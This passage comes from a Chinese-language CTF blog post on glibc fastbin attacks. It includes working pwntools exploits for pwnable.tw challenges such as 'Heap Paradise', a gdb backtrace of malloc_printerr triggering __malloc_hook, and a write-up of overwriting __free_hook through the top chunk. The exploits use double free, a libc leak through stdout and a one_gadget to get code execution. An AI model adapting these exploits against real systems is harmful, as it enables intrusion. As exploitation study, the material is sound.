realloc_offset</span><br><span class="line">one_gadget = libc_base + one_gadget_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># use the double free</span></span><br><span class="line">add(<span class="number">0x68</span>, p64(realloc_hook + <span class="number">8</span> - <span class="number">0x23</span>), <span class="string">"EEEE"</span>) <span class="comment"># chunk 6</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">"FFFF"</span>, <span class="string">"FFFF"</span>) <span class="comment"># chunk 7</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">"GGGG"</span>, <span class="string">"GGGG"</span>) <span class="comment"># chunk 8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># write realloc_hook and malloc_hook</span></span><br><span class="line">add(<span class="number">0x68</span>, (p64(one_gadget) + p64(one_gadget)).rjust(<span class="number">0x1b</span>, <span class="string">"H"</span>), <span class="string">"HHHH"</span>) <span class="comment"># chunk 9</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger malloc_hook (use malloc_printerr, directly call malloc won't work)</span></span><br><span class="line"><span class="comment"># p.sendlineafter("Your choice : ", "1")</span></span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"heap_addr: "</span> + hex(heap_addr))</span><br><span class="line">success(<span class="string">"heap_base: "</span> + hex(heap_base))</span><br><span class="line">success(<span class="string">"main_arena: "</span> + hex(main_arena))</span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"libc_realloc: "</span> + hex(libc_realloc))</span><br><span class="line">success(<span class="string">"realloc_hook: "</span> + hex(realloc_hook))</span><br><span class="line">success(<span class="string">"one_gadget: "</span> + hex(one_gadget))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p><b>一些题外话：</b><br>此外，我搜了很多关于<code>__malloc_printerr</code>是怎么触发<code>__malloc_hook</code>的，都没有找到原因。还是特别想知道，咋办？<br>把<code>__malloc_hook</code>写成<code>puts</code>，在触发前在<code>puts</code>处下断点，然后利用gdb的<code>backtrace</code>看下调用栈，藏得够深（还是<code>malloc</code>触发的，只不过这个这个<code>malloc</code>经过了N层函数调用，所以其实可以直接在<code>malloc</code>下断点就行了）。。</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#<span class="number">0</span>  _IO_puts (str=<span class="number">0x24</span> &lt;error: Cannot access memory at address <span class="number">0x24</span>&gt;) at ioputs.c:<span class="number">33</span></span><br><span class="line">#<span class="number">1</span>  <span class="number">0x00007fe6f4da3d8a</span> in __strdup (s=<span class="number">0x7ffd7c35b6a0</span> <span class="string">"/lib/x86_64-linux-gnu/libgcc_s.so.1"</span>) at strdup.c:<span class="number">42</span></span><br><span class="line">#<span class="number">2</span>  <span class="number">0x00007fe6f4d9f60f</span> in _dl_load_cache_lookup (name=name@entry=<span class="number">0x7fe6f4b49aa6</span> <span class="string">"libgcc_s.so.1"</span>) at dl-cache.c:<span class="number">311</span></span><br><span class="line">#<span class="number">3</span>  <span class="number">0x00007fe6f4d8ff99</span> in _dl_map_object (loader=loader@entry=<span class="number">0x7fe6f4fab4d8</span>, name=name@entry=<span class="number">0x7fe6f4b49aa6</span> <span class="string">"libgcc_s.so.1"</span>, type=type@entry=<span class="number">0x2</span>, trace_mode=trace_mode@entry=<span class="number">0x0</span>, mode=mode@entry=<span class="number">0x90000001</span>, nsid=&lt;optimized out&gt;) at dl-load.c:<span class="number">2342</span></span><br><span class="line">#4  0x00007fe6f4d9c3a7 in dl_open_worker (a=a@entry=0x7ffd7c35bd90) at dl-open.c:237</span><br><span class="line">#<span class="number">5</span>  <span class="number">0x00007fe6f4d97394</span> in _dl_catch_error (objname=objname@entry=<span class="number">0x7ffd7c35bd80</span>, errstring=errstring@entry=<span class="number">0x7ffd7c35bd88</span>, mallocedp=mallocedp@entry=<span class="number">0x7ffd7c35bd7f</span>, operate=operate@entry=<span class="number">0x7fe6f4d9c300</span> &lt;dl_open_worker&gt;, args=args@entry=<span class="number">0x7ffd7c35bd90</span>) at dl-error.c:<span class="number">187</span></span><br><span class="line">#<span class="number">6</span>  <span class="number">0x00007fe6f4d9bbd9</span> in _dl_open (file=<span class="number">0x7fe6f4b49aa6</span> <span class="string">"libgcc_s.so.1"</span>, mode=<span class="number">0x80000001</span>, caller_dlopen=<span class="number">0x7fe6f4ad2fd1</span> &lt;__GI___backtrace+<span class="number">193</span>&gt;, nsid=<span class="number">0xfffffffffffffffe</span>, argc=&lt;optimized out&gt;, argv=&lt;optimized out&gt;, env=<span class="number">0x7ffd7c35cac8</span>) at dl-<span class="built_in">open</span>.c:<span class="number">660</span></span><br><span class="line">#7  0x00007fe6f4b009bd in do_dlopen (ptr=ptr@entry=0x7ffd7c35bfb0) at dl-libc.c:87</span><br><span class="line">#<span class="number">8</span>  <span class="number">0x00007fe6f4d97394</span> in _dl_catch_error (objname=<span class="number">0x7ffd7c35bfa0</span>, errstring=<span class="number">0x7ffd7c35bfa8</span>, mallocedp=<span class="number">0x7ffd7c35bf9f</span>, operate=<span class="number">0x7fe6f4b00980</span> &lt;do_dlopen&gt;, args=<span class="number">0x7ffd7c35bfb0</span>) at dl-error.c:<span class="number">187</span></span><br><span class="line">#9  0x00007fe6f4b00a74 in dlerror_run (args=0x7ffd7c35bfb0, operate=0x7fe6f4b00980 &lt;do_dlopen&gt;) at dl-libc.c:46</span><br><span class="line">#<span class="number">10</span> __GI___libc_dlopen_mode (name=name@entry=<span class="number">0x7fe6f4b49aa6</span> <span class="string">"libgcc_s.so.1"</span>, mode=mode@entry=<span class="number">0x80000001</span>) at dl-libc.c:<span class="number">163</span></span><br><span class="line">#11 0x00007fe6f4ad2fd1 in init () at ../sysdeps/x86_64/backtrace.c:52</span><br><span class="line">#<span class="number">12</span> __GI___backtrace (<span class="built_in">array</span>=<span class="built_in">array</span>@entry=<span class="number">0x7ffd7c35c010</span>, <span class="built_in">size</span>=<span class="built_in">size</span>@entry=<span class="number">0x40</span>) at ../sysdeps/x86_64/backtrace.c:<span class="number">105</span></span><br><span class="line">#13 0x00007fe6f49dd9f5 in backtrace_and_maps (do_abort=&lt;optimized out&gt;, do_abort@entry=0x2, written=&lt;optimized out&gt;, fd=fd@entry=0x3) at ../sysdeps/unix/sysv/linux/libc_fatal.c:47</span><br><span class="line">#<span class="number">14</span> <span class="number">0x00007fe6f4a357e5</span> in __libc_message (do_abort=do_abort@entry=<span class="number">0x2</span>, fmt=fmt@entry=<span class="number">0x7fe6f4b4e2e0</span> <span class="string">"*** Error in `%s': %s: 0x%s ***\n"</span>) at ../sysdeps/posix/libc_fatal.c:<span class="number">172</span></span><br><span class="line">#15 0x00007fe6f4a3de0a in malloc_printerr (ar_ptr=&lt;optimized out&gt;, ptr=&lt;optimized out&gt;, str=0x7fe6f4b4e3a8 "double free or corruption (fasttop)", action=0x3) at malloc.c:5004</span><br><span class="line">#<span class="number">16</span> _int_free (av=&lt;optimized out&gt;, p=&lt;optimized out&gt;, have_lock=<span class="number">0x0</span>) at <span class="built_in">malloc</span>.c:<span class="number">3865</span></span><br><span class="line">#<span class="number">17</span> <span class="number">0x00007fe6f4a4198c</span> in __GI___libc_free (mem=&lt;optimized out&gt;) at <span class="built_in">malloc</span>.c:<span class="number">2966</span></span><br><span class="line">#<span class="number">18</span> <span class="number">0x000055eca8269e79</span> in ?? ()</span><br><span class="line">#<span class="number">19</span> <span class="number">0x000000087c35cab0</span> in ?? ()</span><br><span class="line">#<span class="number">20</span> <span class="number">0x77c3b85bb5ec5800</span> in ?? ()</span><br><span class="line">#<span class="number">21</span> <span class="number">0x0000000000000000</span> in ?? ()</span><br></pre></td></tr></table></figure><p> 最后在<code>__strdup</code>里面调用了一次<code>malloc</code>触发了<code>__malloc_hook</code>：</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *</span><br><span class="line">__strdup (<span class="keyword">const</span> <span class="keyword">char</span> *s)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">size_t</span> len = <span class="built_in">strlen</span> (s) + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">void</span> *<span class="keyword">new</span> = <span class="built_in">malloc</span> (len);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">new</span> == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">char</span> *) <span class="built_in">memcpy</span> (<span class="keyword">new</span>, s, len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> （有点好奇，咋发现的，这也tql。。）</p></blockquote><h4 id="Heap-Paradise"><a href="#Heap-Paradise" class="headerlink" title="Heap Paradise"></a>Heap Paradise</h4><p>程序很简单，<code>delete</code>功能存在明显的free后没有清空指针的漏洞，所以毋庸置疑又是fastbin double free：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 v0; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Index :"</span>);</span><br><span class="line">    v0 = choice();</span><br><span class="line">    <span class="keyword">if</span> ( v0 &lt;= <span class="number">15</span> )</span><br><span class="line">        <span class="built_in">free</span>(chunk_array[v0]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是<code>add</code>功能限制了能分配的堆块的size：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> v0; <span class="comment">// rax</span></span><br><span class="line">    <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">size</span>; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( i &gt; <span class="number">15</span> )</span><br><span class="line">        &#123;</span><br><span class="line">        LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">"You can't allocate anymore !"</span>);</span><br><span class="line">        <span class="keyword">return</span> v0;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( !chunk_array[i] )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Size :"</span>);</span><br><span class="line">    v0 = choice();</span><br><span class="line">    <span class="built_in">size</span> = v0;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &lt;= <span class="number">0x78</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        chunk_array[i] = <span class="built_in">malloc</span>(v0);</span><br><span class="line">        <span class="keyword">if</span> ( !chunk_array[i] )</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Error!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Data :"</span>);</span><br><span class="line">        LODWORD(v0) = read_data((__int64)chunk_array[i], <span class="built_in">size</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要思路就是:</p></li><li><p>利用fastbin double free形成chunk overlap，创造出一个unsorted bin。</p></li><li><p>注意到题目是没有<code>view</code>功能的，所以只能通过partial overwrite <code>unsorted bin-&gt;fd</code>，使其指向<code>_IO_2_1_stdout</code>结构体附近，然后通过fastbin分配该处空间来更改结构体从而完成leak libc。</p></li><li><p>libc leak完成之后，剩下的就是再次利用fastbin double free改<code>__malloc_hook</code>为onegadget。</p></li><li><p>题目的难点在于，只能分配16次chunk，要在有限的chunk里完成这么多动作，考察的就是堆布局的能力了，所以至于如何布局这里就不再赘述了。<br>此外，由于我的写法在完成上述操作之后就用完的所有的<code>add</code>机会，所以只能通过fastbin double free corruption来触发<code>__malloc_hook</code>了。<br><br>我的exp（布局肯定不止这一种，仅供参考）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">one_gadget_offset = <span class="number">0xef6c4</span></span><br><span class="line">malloc_hook_offset = libc.symbols[<span class="string">"__malloc_hook"</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = "debug"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, data)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"You Choice:"</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Size :"</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">"Data :"</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"You Choice:"</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index :"</span>, str(index))</span><br><span class="line"></span><br><span class="line">libc_offset = <span class="number">0x3c4600</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># fastbin double free</span></span><br><span class="line">        add(<span class="number">0x68</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)) <span class="comment"># chunk 0</span></span><br><span class="line">        add(<span class="number">0x28</span>, <span class="string">"BBBB"</span>) <span class="comment"># chunk 1</span></span><br><span class="line">        add(<span class="number">0x28</span>, <span class="string">"CCCC"</span>) <span class="comment"># chunk 2</span></span><br><span class="line">        add(<span class="number">0x68</span>, <span class="string">"D"</span> * <span class="number">0x40</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)) <span class="comment"># chunk 3</span></span><br><span class="line">        delete(<span class="number">0</span>)</span><br><span class="line">        delete(<span class="number">3</span>)</span><br><span class="line">        delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># create unsorted bin</span></span><br><span class="line">        add(<span class="number">0x68</span>, <span class="string">"\x10"</span>) <span class="comment"># chunk 4</span></span><br><span class="line">        add(<span class="number">0x68</span>, <span class="string">"DDDD"</span>) <span class="comment"># chunk 5</span></span><br><span class="line">        add(<span class="number">0x68</span>, <span class="string">"EEEE"</span>) <span class="comment"># chunk 6</span></span><br><span class="line">        add(<span class="number">0x68</span>, <span class="string">"F"</span> * <span class="number">0x50</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xb1</span>)) <span class="comment"># chunk 7</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># # free unsorted bin</span></span><br><span class="line">        delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># # malloc unsorted bin, perform partially write to stdout</span></span><br><span class="line">        delete(<span class="number">3</span>)</span><br><span class="line">        add(<span class="number">0x58</span>, <span class="string">"G"</span> * <span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x81</span>) + p64(<span class="number">0</span>)) <span class="comment"># chunk 8</span></span><br><span class="line">        delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># # brute force 4 bits</span></span><br><span class="line">        add(<span class="number">0x78</span>, <span class="string">"H"</span> * <span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p16(<span class="number">0xa620</span> - <span class="number">0x43</span>)) <span class="comment"># chunk 9</span></span><br><span class="line"></span><br><span class="line">        add(<span class="number">0x68</span>, <span class="string">"IIII"</span>) <span class="comment"># chunk 10</span></span><br><span class="line">        add(<span class="number">0x68</span>, <span class="string">"J"</span> * <span class="number">0x33</span> + p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">"\x00"</span>) <span class="comment"># chunk 11</span></span><br><span class="line"></span><br><span class="line">        string = p.recv(<span class="number">4</span>)</span><br><span class="line">        <span class="keyword">if</span> string == <span class="string">"****"</span> <span class="keyword">or</span> string == <span class="string">"read"</span>:</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">if</span> _pwn_remote == <span class="number">0</span>:</span><br><span class="line">                p = process(argv=[_proc], env=_setup_env())</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                p = remote(<span class="string">'chall.pwnable.tw'</span>, <span class="number">10308</span>)</span><br><span class="line">            <span class="keyword">if</span> _debug != <span class="number">0</span>:</span><br><span class="line">                gdb.attach(p)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p.recv(<span class="number">0x40</span><span class="number">-4</span>)</span><br><span class="line">            libc_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">            libc_base = libc_addr - <span class="number">0x3c4600</span></span><br><span class="line">            malloc_hook = libc_base + malloc_hook_offset</span><br><span class="line">            one_gadget = libc_base + one_gadget_offset</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">if</span> _pwn_remote == <span class="number">0</span>:</span><br><span class="line">            p = process(argv=[_proc], env=_setup_env())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p = remote(<span class="string">'chall.pwnable.tw'</span>, <span class="number">10308</span>)</span><br><span class="line">        <span class="keyword">if</span> _debug != <span class="number">0</span>:</span><br><span class="line">            gdb.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write __malloc_hook</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x68</span>, p64(malloc_hook - <span class="number">0x23</span>)) <span class="comment"># chunk 12</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">"KKKK"</span>) <span class="comment"># chunk 13</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">"LLLL"</span>) <span class="comment"># chunk 14</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">"I"</span> * <span class="number">0x13</span> + p64(one_gadget)) <span class="comment"># chunk 15</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># double free error ==&gt; malloc_printerr ==&gt; __malloc_hook</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> _pwn_remote == <span class="number">1</span>:</span><br><span class="line">    context.log_level = <span class="string">"debug"</span></span><br><span class="line">    p.send(<span class="string">"cat /home/heap_paradise/flag\x00"</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_addr: "</span> + hex(libc_addr))</span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line"><span class="comment"># success("libc_realloc: " + hex(libc_realloc))</span></span><br><span class="line">success(<span class="string">"malloc_hook: "</span> + hex(malloc_hook))</span><br><span class="line">success(<span class="string">"one_gadget: "</span> + hex(one_gadget))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><h2 id="write-free-hook-through-top-chunk"><a href="#write-free-hook-through-top-chunk" class="headerlink" title="write __free_hook through top chunk"></a>write __free_hook through top chunk</h2><p>这应该是最稳的方法之一了，因为直接调<code>system(&quot;/bin/sh&quot;)</code>一般来说没有什么限制，但是利用起来还是要花一点功夫的。</p><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>我们知道fastbin的malloc需要满足size的约束，但是<code>__free_hook</code>的上方全是”\x00”，显然无法直接分配，所以需要借助其他的办法。<br><br>首先了解一下<code>main_arena</code>的结构（这是堆块信息还没有被写入的时候）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">gef➤  p main_arena</span><br><span class="line">$1 &#x3D; &#123;</span><br><span class="line">    mutex &#x3D; 0x0, </span><br><span class="line">    flags &#x3D; 0x0, </span><br><span class="line">    have_fastchunks &#x3D; 0x0, </span><br><span class="line">    fastbinsY &#x3D; &#123;0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0&#125;, </span><br><span class="line">    top &#x3D; 0x0, </span><br><span class="line">    last_remainder &#x3D; 0x0, </span><br><span class="line">    bins &#x3D; &#123;0x0 &lt;repeats 254 times&gt;&#125;, </span><br><span class="line">    binmap &#x3D; &#123;0x0, 0x0, 0x0, 0x0&#125;, </span><br><span class="line">    next &#x3D; 0x7ffff7dcfc40 &lt;main_arena&gt;, </span><br><span class="line">    next_free &#x3D; 0x0, </span><br><span class="line">    attached_threads &#x3D; 0x1, </span><br><span class="line">    system_mem &#x3D; 0x0, </span><br><span class="line">    max_system_mem &#x3D; 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见这个的<code>top</code>储存了top chunk的位置，也就是说当我们需要从top chunk分配内存空间的时候，会从这里获取top chunk的位置信息，然后再切割分配（下图是Glibc 2.27下的情况）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">gef➤  p main_arena</span><br><span class="line">$2 &#x3D; &#123;</span><br><span class="line">    mutex &#x3D; 0x0, </span><br><span class="line">    flags &#x3D; 0x0, </span><br><span class="line">    have_fastchunks &#x3D; 0x0, </span><br><span class="line">    fastbinsY &#x3D; &#123;0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0&#125;, </span><br><span class="line">    top &#x3D; 0x555555757270, </span><br><span class="line">    last_remainder &#x3D; 0x0, </span><br><span class="line">    bins &#x3D; &#123;</span><br><span class="line">               0x7ffff7dcfca0 &lt;main_arena+96&gt;, 0x7ffff7dcfca0 &lt;main_arena+96&gt;, </span><br><span class="line">               0x7ffff7dcfcb0 &lt;main_arena+112&gt;, 0x7ffff7dcfcb0 &lt;main_arena+112&gt;,</span><br><span class="line">               ......</span><br><span class="line">               0x7ffff7dd0480 &lt;main_arena+2112&gt;, 0x7ffff7dd0480 &lt;main_arena+2112&gt;</span><br><span class="line">           &#125;</span><br><span class="line">    binmap &#x3D; &#123;0x0, 0x0, 0x0, 0x0&#125;, </span><br><span class="line">    next &#x3D; 0x7ffff7dcfc40 &lt;main_arena&gt;, </span><br><span class="line">    next_free &#x3D; 0x0, </span><br><span class="line">    attached_threads &#x3D; 0x1, </span><br><span class="line">    system_mem &#x3D; 0x21000, </span><br><span class="line">    max_system_mem &#x3D; 0x21000</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么就可以通过修改<code>main_arena</code>中的<code>top</code>为<code>__free_hook</code>的上方某个区域（该区域存在足够大的数据以充当size字段），然后通过不断地从top chunk分配内存空间直到可以写到<code>__free_hook</code>中去。<br><br>但是观察<code>main_arena</code>上方可以发现，并不能直接利用fastbin attack分配到可以写<code>top</code>的地址空间：<br><img src="/2020/04/15/Fastbin-attack-%E5%B0%8F%E7%BB%93/main_arena.png" alt><br>那么这里还需要多利用一次fastbin attack，在<code>top</code>的上方进行fastbin attack写入size来供后续的fastbin attack改写<code>top</code>。<br><br>还有一个问题，把top chunk改到哪里，经调试发现，在<code>__free_hook-0xb58</code>的位置发现一个足够大的值（随机的）可作为top chunk的size（不知道不同版本的Glibc会不会有差异，这里测试的Glibc 2.23和Gblic 2.27都符合情况）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gef➤  p &amp;__free_hook</span><br><span class="line">$2 &#x3D; (void (**)(void *, const void *)) 0x7ffff7dd18e8 &lt;__free_hook&gt;</span><br><span class="line">gef➤  tele 0x7ffff7dd18e8-0xb58</span><br><span class="line">0x00007ffff7dd0d90│+0x0000: 0x0000000000000004</span><br><span class="line">0x00007ffff7dd0d98│+0x0008: 0x9aa83c6e1b4e13d1</span><br><span class="line">0x00007ffff7dd0da0│+0x0010: 0x0000000000000000</span><br><span class="line">0x00007ffff7dd0da8│+0x0018: 0x0000000000000000</span><br><span class="line">0x00007ffff7dd0db0│+0x0020: 0x0000000000000000</span><br><span class="line">0x00007ffff7dd0db8│+0x0028: 0x0000000000000000</span><br><span class="line">0x00007ffff7dd0dc0│+0x0030: 0x0000000000000000</span><br><span class="line">0x00007ffff7dd0dc8│+0x0038: 